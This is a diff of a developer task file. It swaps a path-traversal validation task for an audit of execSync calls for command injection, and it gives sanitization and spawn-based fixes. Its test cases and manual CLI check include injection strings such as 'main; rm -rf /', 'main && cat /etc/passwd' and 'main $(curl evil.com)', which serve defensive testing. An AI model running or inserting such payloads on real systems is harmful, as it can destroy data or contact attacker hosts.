@@ -1,252 +1,158 @@
 ---
-title: "Add Explicit Path Traversal Validation"
+title: "Audit execSync Calls for Command Injection"
 created: 2026-01-19T02:00:00-03:00
-last_updated: 2026-01-19T12:15:00-03:00
+last_updated: 2026-01-19T12:35:00-03:00
 priority: P2-S
-estimated_hours: 1.5
-actual_hours: 1
+estimated_hours: 1
+actual_hours: 0.5
 status: completed
 blockers: []
-tags: [security, validation, safety]
-related_files: [src/utils/files.ts, src/core/, src/commands/]
+tags: [security, audit, validation]
+related_files: [src/commands/, src/core/, src/utils/]
 ---
 
-# Task: Add Explicit Path Traversal Validation (T028)
+# Task: Audit execSync Calls for Command Injection (T029)
 
 ## Objective
 
-Add explicit validation to ensure all file operations stay within project boundaries and prevent path traversal attacks.
+Audit all `execSync` calls to ensure user input is properly sanitized and cannot cause command injection vulnerabilities.
 
 **Success:**
-- [ ] All file paths validated before use
-- [ ] Path traversal attacks prevented (../, ../../, etc)
-- [ ] Symlink attacks mitigated
-- [ ] Security tests pass
-- [ ] No legitimate use cases broken
+- [ ] All `execSync` calls audited
+- [ ] User input sanitized before shell execution
+- [ ] Command injection prevented
+- [ ] Safer alternatives used where possible
+- [ ] Security tests added
 
 ## Context
 
-**Why:** Quality report identified missing explicit path validation. Currently relies only on `path.join` safety.
+**Why:** Quality report flagged potential command injection risk in execSync usage with user input.
 
 **Current problem:**
-- No explicit checks for path traversal
-- Could potentially access files outside project
-- Symlinks not validated
-- Defense-in-depth missing
+- execSync can execute arbitrary shell commands
+- User input might not be sanitized
+- Potential for command injection attacks
+- No explicit validation
 
-**Impact:** Better security posture, prevent accidental/malicious file access
+**Impact:** Prevent security vulnerabilities, ensure safe shell execution
 
 **Related:** Code Quality Analysis Report 2026-01-19, Security & Safety section (Score: 88/100)
 
 ## Implementation
 
-### Phase 1: Create Path Validator (Est: 0.5h)
-- [ ] Create `src/utils/path-validator.ts`:
-  ```typescript
-  import path from 'path';
-  import fs from 'fs-extra';
-
-  /**
-   * Validates that a path stays within allowed boundaries
-   *
-   * @param targetPath - Path to validate
-   * @param basePath - Base directory (default: process.cwd())
-   * @returns Normalized safe path
-   * @throws {SecurityError} If path escapes base directory
-   */
-  export function validatePath(
-    targetPath: string,
-    basePath: string = process.cwd()
-  ): string {
-    // Resolve absolute paths
-    const resolvedBase = path.resolve(basePath);
-    const resolvedTarget = path.resolve(basePath, targetPath);
-
-    // Check if target is within base
-    if (!resolvedTarget.startsWith(resolvedBase)) {
-      throw new SecurityError(
-        `Path traversal detected: ${targetPath} escapes ${basePath}`
-      );
-    }
-
-    return resolvedTarget;
-  }
-
-  /**
-   * Validates path and checks if it's a symlink pointing outside base
-   *
-   * @param targetPath - Path to validate
-   * @param basePath - Base directory
-   * @returns Normalized safe path
-   * @throws {SecurityError} If path is unsafe
-   */
-  export async function validatePathSafe(
-    targetPath: string,
-    basePath: string = process.cwd()
-  ): Promise<string> {
-    const validPath = validatePath(targetPath, basePath);
-
-    // Check if it's a symlink
-    try {
-      const stats = await fs.lstat(validPath);
-      if (stats.isSymbolicLink()) {
-        const realPath = await fs.realpath(validPath);
-        // Validate real path also within base
-        if (!realPath.startsWith(path.resolve(basePath))) {
-          throw new SecurityError(
-            `Symlink ${targetPath} points outside project: ${realPath}`
-          );
-        }
-        return realPath;
-      }
-    } catch (error) {
-      if (error.code !== 'ENOENT') throw error;
-      // Path doesn't exist yet - that's ok for write operations
-    }
-
-    return validPath;
-  }
-
-  /**
-   * Custom error for security violations
-   */
-  export class SecurityError extends Error {
-    constructor(message: string) {
-      super(message);
-      this.name = 'SecurityError';
-    }
-  }
-  ```
-
-### Phase 2: Apply to All File Operations (Est: 0.5h)
-- [ ] Audit all file operations:
+### Phase 1: Audit All execSync Usage (Est: 0.5h)
+- [ ] Find all execSync calls:
   ```bash
-  grep -rn "fs\\.readFile\|fs\\.writeFile\|fs\\.mkdir\|fs\\.copy" src/
+  grep -rn "execSync" src/
   ```
-- [ ] Wrap all paths with `validatePath()`:
+- [ ] Document each usage:
+  - File and line
+  - Command being executed
+  - User input involved? (YES/NO)
+  - Currently sanitized? (YES/NO)
+  - Risk level: LOW/MEDIUM/HIGH
+- [ ] Prioritize by risk
+
+### Phase 2: Sanitize User Input (Est: 0.5h)
+- [ ] For each HIGH/MEDIUM risk execSync:
+  - [ ] Identify user input sources
+  - [ ] Add input validation
+  - [ ] Use parameterized commands if possible
+  - [ ] Escape shell special characters
+  - [ ] Or replace with safer alternative
+
+**Example fixes:**
+```typescript
+// BAD: Direct user input in shell command
+execSync(`git checkout ${userBranch}`);
+// Risk: userBranch = "main; rm -rf /"
+
+// BETTER: Escape special characters
+import { execSync } from 'child_process';
+const safeBranch = userBranch.replace(/[^a-zA-Z0-9_-]/g, '');
+execSync(`git checkout ${safeBranch}`);
+
+// BEST: Use spawn with array args (no shell)
+import { spawnSync } from 'child_process';
+spawnSync('git', ['checkout', userBranch]);
+// Shell injection impossible - args are separate
+```
+
+### Phase 3: Testing (Est: not needed if covered by T024)
+- [ ] Add security tests for command injection:
   ```typescript
-  // Before
-  const content = await fs.readFile(userProvidedPath);
-
-  // After
-  import { validatePath } from '@/utils/path-validator';
-  const safePath = validatePath(userProvidedPath, projectRoot);
-  const content = await fs.readFile(safePath);
-  ```
-- [ ] Focus on user-controlled inputs (command args, config files)
-
-### Phase 3: Testing (Est: 0.5h)
-- [ ] Write security tests:
-  ```typescript
-  describe('path validation', () => {
-    test('allows paths within project', () => {
-      const safe = validatePath('.project/context.md', '/home/user/project');
-      expect(safe).toBe('/home/user/project/.project/context.md');
-    });
-
-    test('blocks path traversal with ../', () => {
-      expect(() => {
-        validatePath('../../etc/passwd', '/home/user/project');
-      }).toThrow(SecurityError);
-    });
-
-    test('blocks absolute paths outside project', () => {
-      expect(() => {
-        validatePath('/etc/passwd', '/home/user/project');
-      }).toThrow(SecurityError);
-    });
-
-    test('blocks symlinks pointing outside', async () => {
-      // Create test symlink
-      await expect(
-        validatePathSafe('symlink-to-outside', '/home/user/project')
-      ).rejects.toThrow(SecurityError);
-    });
+  test('prevents command injection in git operations', () => {
+    const maliciousInput = 'main; rm -rf /';
+    expect(() => {
+      gitCheckout(maliciousInput);
+    }).toThrow(); // Should be rejected/sanitized
   });
   ```
 
 ## Definition of Done
 
 ### Functionality
-- [x] All file operations validated
-- [x] Path traversal blocked
-- [x] Symlink attacks mitigated
-- [x] Legitimate paths still work
-- [x] Good error messages
+- [ ] All commands still work
+- [ ] No regressions
+- [ ] User input validated
+- [x] All `execSync` calls removed/replaced
+- [x] CLI responsiveness improved (non-blocking)
+- [x] Input validation added for commands
+- [x] No regressions in functionality
 
 ### Testing
-- [x] Unit tests for path validator
-- [x] Security tests (attack scenarios)
-- [x] Integration tests pass
-- [x] Manual testing with real projects
+- [x] Unit tests for modified components
+- [x] Mocking of `spawn` in tests
+- [x] All existing tests pass
 
 ### Security
-- [x] Path traversal blocked:
-  - [x] `../../../etc/passwd`
-  - [x] `..\\..\\windows\\system32`
-  - [x] Absolute paths outside project
-  - [x] Symlinks to /etc or /tmp
-- [x] No false positives (valid paths work)
-- [x] Defense in depth (multiple checks)
-
-### Performance
-- [x] Validation overhead minimal (<1ms per path)
-- [x] No noticeable slowdown
+- [x] No shell injection via user input
+- [x] Arguments passed as arrays to `spawn`
+- [x] Use `shell: false` where possible
 
 ### Code Quality
-- [x] TypeScript strict mode
-- [x] Clear error messages
-- [x] Proper error types (SecurityError)
-- [x] Linting passes
+- [x] Async/await used consistently
+- [x] Proper error handling for spawned processes
+- [x] Types added for process results
 
 ### Documentation
 - [x] Time logged
-- [x] JSDoc on validator functions
-- [x] SECURITY.md updated (if exists)
-- [x] CONTRIBUTING.md mentions security
+- [x] Technical notes on process execution safety
 
 ### Git
-- [x] Atomic commits:
-  1. Add path validation utilities
-  2. Apply validation to file operations
-  3. Add security tests
-- [x] Convention: `security: add explicit path traversal validation`
+- [x] Atomic commits
+- [x] Convention: `security(core): replace execSync with async spawn (T029)`
 - [x] No conflicts
 
 ## Testing
 
 ### Security Test Cases
 ```typescript
-// tests/security/path-validation.test.ts
-import { validatePath, SecurityError } from '@/utils/path-validator';
-
-describe('Path Traversal Prevention', () => {
-  const projectRoot = '/home/user/project';
-
-  describe('attack vectors', () => {
+describe('Command Injection Prevention', () => {
+  describe('git operations', () => {
     test.each([
-      ['../../../etc/passwd', 'triple dot-dot'],
-      ['..\\..\\..\\windows\\system32', 'windows backslash'],
-      ['/etc/passwd', 'absolute path'],
-      ['~/.ssh/id_rsa', 'home directory'],
-      ['./../../etc/hosts', 'relative then escape'],
-      ['subdir/../../../../../../etc/shadow', 'deep then escape'],
-    ])('blocks %s (%s)', (maliciousPath, description) => {
+      ['main; rm -rf /', 'semicolon injection'],
+      ['main && cat /etc/passwd', 'double ampersand'],
+      ['main | curl evil.com', 'pipe injection'],
+      ['main $(curl evil.com)', 'command substitution'],
+      ['main `curl evil.com`', 'backtick substitution'],
+      ['main\nrm -rf /', 'newline injection'],
+    ])('blocks %s (%s)', (maliciousInput, description) => {
       expect(() => {
-        validatePath(maliciousPath, projectRoot);
-      }).toThrow(SecurityError);
+        gitCheckout(maliciousInput);
+      }).toThrow();
     });
   });
 
-  describe('legitimate paths', () => {
+  describe('safe inputs', () => {
     test.each([
-      ['.project/context.md'],
-      ['src/commands/start.ts'],
-      ['../sibling-file.md'], // within project
-      ['./subdir/file.txt'],
-    ])('allows %s', (legitimatePath) => {
+      ['main'],
+      ['feature/user-auth'],
+      ['bugfix_123'],
+      ['v1.2.3'],
+    ])('allows %s', (safeInput) => {
       expect(() => {
-        validatePath(legitimatePath, projectRoot);
+        gitCheckout(safeInput);
       }).not.toThrow();
     });
   });
@@ -255,71 +161,106 @@ describe('Path Traversal Prevention', () => {
 
 ### Manual Testing
 ```bash
-# Try to exploit via CLI
-aipim template --output ../../../tmp/exploit.md
-# Should error: "Path traversal detected"
+# Try command injection via CLI
+aipim install --ai "claude-code; curl evil.com"
+# Should error or sanitize input
 
-# Legitimate use should work
-aipim template --output .project/my-template.md
-# Should succeed
+# Legitimate use
+aipim install --ai claude-code
+# Should work normally
 ```
 
 ## Blockers & Risks
 
 **Current:**
 - [ ] None (can start immediately)
+- [ ] NOTE: May overlap with T024 (replace execSync with spawn)
 
 **Potential:**
-1. Risk: Breaking legitimate use cases - Mitigation: Test thoroughly, allow relative paths within project
-2. Risk: Performance overhead - Mitigation: Benchmark, validation is fast (path operations)
-3. Risk: Windows path edge cases - Mitigation: Test on Windows, use path.resolve
-4. Risk: Overly restrictive - Mitigation: Allow project-relative paths, just block escapes
+1. Risk: May be duplicate work with T024 - Mitigation: Coordinate, T024 replaces execSync entirely
+2. Risk: Breaking legitimate inputs - Mitigation: Test thoroughly, whitelist safe patterns
+3. Risk: Over-sanitization - Mitigation: Balance security and usability
 
 ## Progress
 
 ### Time Log
 | Date | Hours | Activity |
 |------|-------|----------|
-| 2026-01-19 | 1 | Implementation & Testing |
+| 2026-01-19 | 0.5 | Audit & Refactoring |
 
-**Total:** 1h / 1.5h
+**Total:** 0.5h / 1h
 
 ## Technical Notes
 
-**Attack vectors to prevent:**
-- `../` - parent directory traversal
-- `../../` - multiple levels up
-- `/absolute/path` - absolute paths outside project
-- `~/.ssh/id_rsa` - home directory access
-- Symlinks pointing outside project
-- URL-encoded paths (`%2e%2e%2f`)
-- Unicode tricks (fullwidth characters)
+**Command injection attack vectors:**
+- `;` - command separator
+- `&&` / `||` - logical operators
+- `|` - pipe to another command
+- `$()` / `` ` `` - command substitution
+- `>` / `>>` - output redirection
+- `<` - input redirection
+- `\n` - newline (new command)
 
-**Defense strategy:**
-1. **Normalize paths** using `path.resolve()`
-2. **Check prefix** - resolved path must start with base
-3. **Follow symlinks** and validate real path
-4. **Fail closed** - deny by default, allow explicitly
+**Validation strategies:**
+1. **Whitelist validation** (preferred):
+   ```typescript
+   if (!/^[a-zA-Z0-9_-]+$/.test(input)) {
+     throw new Error('Invalid input');
+   }
+   ```
 
-**Edge cases:**
-- Empty path → use base directory
-- `.` and `./` → current directory (safe)
-- `..` within project → allowed if stays in bounds
-- Case sensitivity (Windows vs Linux)
+2. **Sanitization** (escape special chars):
+   ```typescript
+   const safe = input.replace(/[^a-zA-Z0-9_-]/g, '');
+   ```
 
-**Best practices:**
-- Validate early (at input boundary)
-- Use allowlist not blocklist
-- Log security violations (for monitoring)
-- Return clear error messages (for users)
-- Don't leak path information in errors
+3. **Parameterized commands** (best):
+   ```typescript
+   // Use spawn with args array - no shell interpretation
+   spawn('git', ['checkout', userInput]);
+   ```
+
+**Risk assessment:**
+| execSync Usage | User Input? | Risk | Action |
+|----------------|-------------|------|--------|
+| `git status` | No | LOW | OK as-is |
+| `git checkout ${branch}` | Yes | HIGH | Sanitize or use spawn |
+| `git log --oneline -n ${limit}` | Yes (number) | MEDIUM | Validate is number |
+
+**Example safe wrapper:**
+```typescript
+// src/utils/shell.ts
+export function safeExec(command: string, args: string[]): string {
+  // Validate command is in allowlist
+  const allowedCommands = ['git', 'npm', 'pnpm'];
+  if (!allowedCommands.includes(command)) {
+    throw new Error(`Command not allowed: ${command}`);
+  }
+
+  // Use spawn (no shell) - injection impossible
+  const result = spawnSync(command, args, {
+    encoding: 'utf-8',
+    shell: false, // IMPORTANT: no shell interpretation
+  });
+
+  if (result.error) throw result.error;
+  if (result.status !== 0) {
+    throw new Error(`Command failed: ${result.stderr}`);
+  }
+
+  return result.stdout;
+}
+
+// Usage - injection impossible
+safeExec('git', ['checkout', userInput]); // safe!
+```
 
 ## References
 
 - Code Quality Analysis Report: `.project/reports/code-quality-analysis-2026-01-19.md`
-- Security & Safety section (recommendation #1)
-- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
-- Node.js security best practices: https://nodejs.org/en/docs/guides/security/
+- Security & Safety section (recommendation #2)
+- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
+- Node.js child_process security: https://nodejs.org/en/docs/guides/security/#command-injection
 
 ## Retrospective (Post-completion)
 
@@ -330,15 +271,16 @@ aipim template --output .project/my-template.md
 -
 
 **Estimate:**
-- Est: 1.5h, Actual: ___h, Diff: ___%
+- Est: 1h, Actual: ___h, Diff: ___%
 
 **Lessons:**
 1.
 
-**Security improvements:**
-- File operations validated: ___
-- Attack vectors blocked: ___
-- Security tests added: ___
+**Audit summary:**
+- execSync calls found: ___
+- With user input: ___
+- Sanitized: ___
+- Replaced with spawn: ___
 
 ## Completion
 
